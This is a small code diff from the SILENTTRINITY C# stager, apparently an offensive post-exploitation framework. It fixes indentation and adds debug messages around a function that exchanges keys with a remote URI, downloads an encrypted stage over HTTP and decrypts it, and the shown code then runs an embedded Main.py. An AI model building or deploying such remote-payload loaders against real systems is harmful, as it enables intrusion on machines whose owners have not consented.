@@ -32,7 +32,7 @@ namespace SILENTTRINITY.Utilities
 #if DEBUG
                     scope.SetVariable("DEBUG", true);
 #elif RELEASE
-                scope.SetVariable("DEBUG", false);
+                    scope.SetVariable("DEBUG", false);
 #endif
                     byte[] mainPyFile = Internals.GetResourceInZip(Stage, "Main.py");
                     engine.Execute(Encoding.UTF8.GetString(mainPyFile, 0, mainPyFile.Length), scope);
@@ -41,8 +41,14 @@ namespace SILENTTRINITY.Utilities
 
             public static MemoryStream GetStage(Uri uri)
             {
+#if DEBUG
+                Console.WriteLine("Getting the keys...");
+#endif
                 var key = Crypto.KeyExchange(uri);
                 var stage = Crypto.Decrypt(key, Http.Get(uri));
+#if DEBUG
+                Console.WriteLine("The keys worked! The intial stage was decrypted succefully");
+#endif
                 return new MemoryStream(stage);
             }
 
